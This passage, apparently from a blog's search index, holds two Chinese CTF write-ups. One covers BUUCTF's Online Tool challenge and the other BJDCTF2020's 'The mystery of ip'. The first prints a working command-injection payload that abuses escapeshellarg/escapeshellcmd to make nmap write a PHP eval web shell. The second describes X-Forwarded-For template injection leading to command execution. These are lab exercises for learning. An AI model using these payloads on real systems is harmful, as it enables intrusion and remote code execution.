+<h3 id="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"><a href="#escapeshellarg和escapeshellcmd使用不当会造成引号逃逸" class="headerlink" title="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"></a>escapeshellarg和escapeshellcmd使用不当会造成引号逃逸</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是两次转义之后出现问题了，导致单引号逃逸</p>
+<p>源代码里echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+<p>可以有传入参数，经过两层过滤常见的命令注入操作都不行</p>
+<p>因为escapeshellcmd会对前面的特殊符号进行转义，但是我们有nmap可以有哦那个nmap来执行就是上面的oG</p>
+<p>就可以想到上传一句话木马了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>返回了文件夹名字</p>
+<p>我们直接蚁剑链接就行了</p>
+<p><img src="/2022/02/03/OnlineTool/6.png" alt="1"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">注意：?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br><span class="line">单引号前面一定要加空格跟引号</span><br><span class="line">如果没有加引号，生成的文件名后面会多一个引号</span><br><span class="line">如果加了引号不加空格</span><br><span class="line">那么文件名后面会多\\</span><br><span class="line">只有让生成的所有引号全部跟我们的引号结合之后全部闭合才能够执行</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Themysteryofip</title>
+    <url>/2022/02/03/Themysteryofip/</url>
+    <content><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>做一下题目：</p>
+<p><img src="/2022/02/03/Themysteryofip/1.png" alt="1"></p>
+<p>有三个子网页</p>
+<p>flag以及hint</p>
+<p>flag网页中回显了ip</p>
+<p><img src="/2022/02/03/Themysteryofip/2.png" alt="1"></p>
+<p>看看第另一个子网页，源码发现一句话</p>
+<p><img src="/2022/02/03/Themysteryofip/3.png" alt="1"></p>
+<p>回到flag网页中注入一下XFF</p>
+<p>发现可以</p>
+<p><img src="/2022/02/03/Themysteryofip/4.png" alt="1"></p>
+<p>尝试一下函数发现不会执行</p>
+<p><img src="/2022/02/03/Themysteryofip/9.png" alt="1"></p>
+<p>试试别的方法，输入加减乘除看看有没有模板漏洞</p>
+<p><img src="/2022/02/03/Themysteryofip/6.png" alt="1"></p>
+<p>发现有模板漏洞</p>
+<p>利用一下直接执行命令</p>
+<p><img src="/2022/02/03/Themysteryofip/7.png" alt="1"></p>
+<p>发现可以直接执行</p>
+<p>直接执行cat /flag</p>
+<p><img src="/2022/02/03/Themysteryofip/8.png" alt="1"></p>
+<p>就可以拿到flag</p>
+]]></content>
+      <tags>
+        <tag>BJDCTF</tag>
+      </tags>
+  </entry>
+</search>
